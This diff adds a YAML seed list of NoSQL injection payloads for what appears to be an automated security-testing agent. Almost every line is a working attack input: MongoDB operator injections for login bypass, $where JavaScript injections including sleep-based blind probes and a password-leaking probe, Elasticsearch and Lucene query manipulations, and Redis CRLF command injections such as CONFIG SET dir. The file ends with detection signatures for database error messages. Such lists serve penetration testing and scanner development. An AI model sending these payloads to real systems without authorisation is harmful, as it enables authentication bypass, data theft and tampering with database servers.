@@ -1,0 +1,82 @@
+# NoSQL injection payloads — seed list for the NoSQL injection agent
+#
+# Covers MongoDB operator injection (both JSON body and URL-encoded form params),
+# server-side JavaScript injection via $where, Elasticsearch query manipulation,
+# and Redis CRLF command injection via HTTP parameters.
+#
+# The agent first probes JSON body parameters (Content-Type: application/json),
+# then falls back to URL-encoded form params, and finally tries operator injection
+# via query string when neither content type yields a response change.
+
+payloads:
+  mongodb_operator:
+    # JSON value variants — replace a string parameter value with an operator object.
+    # These are sent as the value of the target parameter in a JSON body.
+    - '{"$gt": ""}'
+    - '{"$ne": null}'
+    - '{"$ne": ""}'
+    - '{"$gt": "", "$lt": "~"}'
+    - '{"$regex": ".*"}'
+    - '{"$regex": "^"}'
+    - '{"$in": ["admin", "user", "root"]}'
+    - '{"$exists": true}'
+    - '{"$type": 2}'
+    # URL-encoded form / query-string variants — param[$op]=value notation
+    # The agent appends these directly to the parameter name in the query string.
+    - "[$gt]="
+    - "[$ne]="
+    - "[$regex]=.*"
+    - "[$gt]=&"
+    - "[$ne]=null"
+    - "[$in][]=admin&[$in][]=user"
+    - "[$exists]=true"
+
+  mongodb_js_injection:
+    # $where clause accepts a JavaScript expression or function body.
+    # Vulnerable when user input is interpolated into a $where query without sanitisation.
+    - '{"$where": "1==1"}'
+    - '{"$where": "function(){ return true; }"}'
+    - '{"$where": "1; return 1"}'
+    - '{"$where": "return true"}'
+    # Blind time-based variant — confirms injection via response delay
+    # sleep() is available in MongoDB server-side JS (SpiderMonkey engine)
+    - '{"$where": "sleep(5000)"}'
+    - '{"$where": "function(){ sleep(5000); return true; }"}'
+    # Exfiltration probe — causes an error that leaks the current document
+    - '{"$where": "this.password.match(/.*/) && true"}'
+
+  elasticsearch:
+    # Full match-all query — replace the request body when it is an Elasticsearch query
+    - '{"query": {"match_all": {}}}'
+    # Bool query bypass — evaluates to true for every document
+    - '{"query": {"bool": {"should": [{"match_all": {}}]}}}'
+    # Lucene query string injection via the q parameter
+    - "q=*"
+    - "q=*:*"
+    - "q=1 OR 1=1"
+    - "q=\" OR \"1\"=\"1"
+    # Nested field probe — enumerates internal field names
+    - '{"query": {"exists": {"field": "_id"}}}'
+    # Script-based injection (Groovy/Painless) — only on older Elasticsearch versions
+    - '{"script": {"lang": "painless", "source": "1==1"}}'
+
+  redis_crlf:
+    # Redis command injection via CRLF — when user input is forwarded to a Redis
+    # connection without sanitisation, injecting CRLF characters allows appending
+    # arbitrary Redis commands. The agent injects these as parameter values.
+    - "test\r\nSET injected 1\r\n"
+    - "test\r\nCONFIG SET dir /tmp\r\n"
+    - "%0d%0aSET%20injected%201%0d%0a"
+    - "%0d%0aPING%0d%0a"
+    # Newline-only variant for servers that normalise \r
+    - "test\nSET injected 1\n"
+    - "%0aSET%20injected%201%0a"
+
+# Detection signatures — matched against raw response body (case-insensitive)
+match_signatures:
+  - 'SyntaxError.*\$where'
+  - 'MongoError'
+  - 'CastError'
+  - 'ElasticsearchException'
+  - 'mongo.*exception'
+  - 'BSONObj.*size'
